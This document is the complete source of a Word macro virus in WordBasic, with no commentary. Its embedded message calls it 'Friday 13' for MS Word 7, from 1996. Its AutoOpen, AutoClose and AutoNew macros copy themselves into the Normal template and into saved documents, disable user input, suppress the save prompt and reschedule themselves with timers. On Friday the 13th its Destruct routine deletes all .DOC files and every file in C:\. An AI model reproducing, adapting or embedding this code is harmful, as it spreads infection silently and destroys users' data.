   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClosex"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim Flag_i
   Dim count_
   Dim name_$
   Dim t
   Dim t1
   Dim Alarm$
   Dim norm$
   True_ = -1: False_ = 0
   Dim dlg2 As Object: Set dlg2 = WordBasic.DialogRecord.DocumentStatistics(False)

   Flag_i = False_
   For count_ = 1 To WordBasic.CountMacros(0)
       name_$ = WordBasic.[MacroName$](count_, 0)
       If name_$ = "Âàêö000" Then Flag_i = True_
   Next count_

   If Flag_i = True_ Then
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Âàêö000"
   Else
       If WordBasic.IsDocumentDirty() = True_ Then

           If WordBasic.CountMacros(1) = 0 Then
               WordBasic.FileSaveAs Format:=1
           Else
               WordBasic.CurValues.DocumentStatistics dlg2
               name_$ = dlg2.Directory + "\" + dlg2.FileName
               DelMacro "AutoOpen", name_$
               DelMacro "Begin", name_$
               DelMacro "AutoClosex", name_$
               DelMacro "AutoOpenx", name_$
               DelMacro "Fri13x", name_$
           End If

           WordBasic.CurValues.DocumentStatistics dlg2
           name_$ = dlg2.Directory + "\" + dlg2.FileName
           norm$ = dlg2.Template

           MoveD "Beginf", "Begin", norm$, name_$
           MoveD "AutoClose", "AutoClosex", norm$, name_$
           MoveD "AutoOpen", "AutoOpenx", norm$, name_$
           MoveD "AutoOpenf", "AutoOpen", norm$, name_$
           MoveD "Fri13", "Fri13x", norm$, name_$
       End If
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Fri13"
   End If

   End Sub

   Private Sub MoveD(inp$, outp$, nameinp$, NameOut$)
       WordBasic.Organizer Copy:=1, Source:=nameinp$, Destination:=NameOut$, Name:=inp$, Tab:=3
       WordBasic.Organizer Rename:=1, Source:=NameOut$, Name:=inp$, NewName:=outp$, Tab:=3
   End Sub

   Private Sub DelMacro(NameMscro$, NameOut$)
   Dim True_
   Dim False_
   Dim Flag_i
   Dim count_
   Dim name_$
       True_ = -1: False_ = 0
       Flag_i = False_
       For count_ = 1 To WordBasic.CountMacros(1)
           name_$ = WordBasic.[MacroName$](count_, 1)
           If name_$ = NameMscro$ Then Flag_i = True_
       Next count_
       If Flag_i = True_ Then WordBasic.Organizer Delete:=1, Source:=NameOut$, Name:=NameMscro$, Tab:=3
   End Sub

   Attribute VB_Name = "AutoOpenx"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim Flag_i
   Dim count_
   Dim name_$
   Dim t
   Dim t1
   Dim Alarm$
   True_ = -1: False_ = 0

   Flag_i = False_
   For count_ = 1 To WordBasic.CountMacros(0)
       name_$ = WordBasic.[MacroName$](count_, 0)
       If name_$ = "Âàêö000" Then Flag_i = True_
   Next count_

   If Flag_i = True_ Then
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Âàêö000"
   Else
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13.Kor1$", WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Fri13"
   End If

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim t1
   Dim t
   Dim Alarm$
   WordBasic.DisableInput 1
   t1 = WordBasic.Now()
   t = t1 + WordBasic.TimeValue("0:00:03")

   Alarm$ = Str(WordBasic.Hour(t)) + ":" + Kor1$(WordBasic.Minute(t)) + ":" + Kor1$(WordBasic.Second(t))

   WordBasic.OnTime Alarm$, "Begin"

   End Sub


   Private Function Kor1$(Argument)
   Dim s$
       s$ = WordBasic.[LTrim$](Str(Argument))
       If Argument < 10 Then s$ = "0" + s$
       Kor1$ = s$
   End Function

   Attribute VB_Name = "Fri13x"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim zader$
   Dim Flag_i
   Dim count_
   Dim name_$
   Dim t1
   Dim t
   Dim Alarm$
   WordBasic.DisableInput 1
   True_ = -1: False_ = 0
   zader$ = "0:01:00"
   Flag_i = False_
   For count_ = 1 To WordBasic.CountMacros(0)
       name_$ = WordBasic.[MacroName$](count_, 0)
       If name_$ = "Âàêö000" Then Flag_i = True_
   Next count_

   t1 = WordBasic.Now()

   If Flag_i = True_ Then
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + Kor1$(WordBasic.Minute(t)) + ":" + Kor1$(WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Âàêö000"
   Else

   t = t1 + WordBasic.TimeValue(zader$)

   Alarm$ = Str(WordBasic.Hour(t)) + ":" + Kor1$(WordBasic.Minute(t)) + ":" + Kor1$(WordBasic.Second(t))
   If WordBasic.CountWindows() > 0 Then Destruct
   WordBasic.OnTime Alarm$, "Fri13"
   End If

   End Sub


   Private Function Kor1$(Argument)
   Dim s$
       s$ = WordBasic.[LTrim$](Str(Argument))
       If Argument < 10 Then s$ = "0" + s$
       Kor1$ = s$
   End Function

   Private Sub Destruct()
       If (WordBasic.Weekday(WordBasic.Now()) = 6) And (WordBasic.Day(WordBasic.Now()) = 13) Then
           WordBasic.DisableInput 1
           WordBasic.Kill "*.DOC"
           WordBasic.Kill "C:\*.*"
           WordBasic.MsgBox " Ïîñâÿùàåòñÿ î÷åðåäíîìó ñíèæåíèþ " + Chr(10) + Chr(13) + "        îïëàòû òðóäà â ÁåëÃÒÀÑÌ " + Chr(10) + Chr(13) + "                       (1996ã)", "   Âèðóñ 'Ïÿòíèöà 13' äëÿ MS WORD 7.", 64
       End If
   End Sub

   Attribute VB_Name = "Begin"

   Public Sub MAIN()
   Dim True_
   Dim False_
   Dim Flag_v
   Dim Flag_i
   Dim count_
   Dim name_$
   Dim t
   Dim t1
   Dim Alarm$
   Dim dlg2 As Object
   Dim norm$
   WordBasic.DisableInput 1
   True_ = -1: False_ = 0

   Flag_v = False_: Flag_i = False_
   For count_ = 1 To WordBasic.CountMacros(0)
       name_$ = WordBasic.[MacroName$](count_, 0)
       If name_$ = "Âàêö000" Then Flag_i = True_
       If name_$ = "Fri13" Then Flag_v = True_
   Next count_

   If Flag_i = True_ Then
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13x.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13x.Kor1$", WordBasic.Second(t))
       WordBasic.OnTime Alarm$, "Âàêö000"
   Else
     If Flag_v = False_ Then
       Set dlg2 = WordBasic.DialogRecord.DocumentStatistics(False)
       WordBasic.CurValues.DocumentStatistics dlg2
       name_$ = dlg2.Directory + "\" + dlg2.FileName
       norm$ = dlg2.Template

       Move_ "AutoOpen", "AutoOpenf", name_$, norm$
       Move_ "Begin", "Beginf", name_$, norm$
       Move_ "AutoClosex", "AutoClose", name_$, norm$
       Move_ "AutoOpenx", "AutoOpen", name_$, norm$
       Move_ "AutoOpenx", "AutoNew", name_$, norm$
       Move_ "Fri13x", "Fri13", name_$, norm$
       t = t1 + WordBasic.TimeValue("0:00:32")
       Alarm$ = Str(WordBasic.Hour(t)) + ":" + WordBasic.Call("Fri13x.Kor1$", WordBasic.Minute(t)) + ":" + WordBasic.Call("Fri13x.Kor1$", WordBasic.Second(t))
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
       WordBasic.OnTime Alarm$, "Fri13"
   End If
   End If

   End Sub

   Private Sub Move_(inp$, outp$, name_$, norm$)
       WordBasic.Organizer Copy:=1, Source:=name_$, Destination:=norm$, Name:=inp$, Tab:=3
       WordBasic.Organizer Rename:=1, Source:=norm$, Name:=inp$, NewName:=outp$, Tab:=3
   End Sub
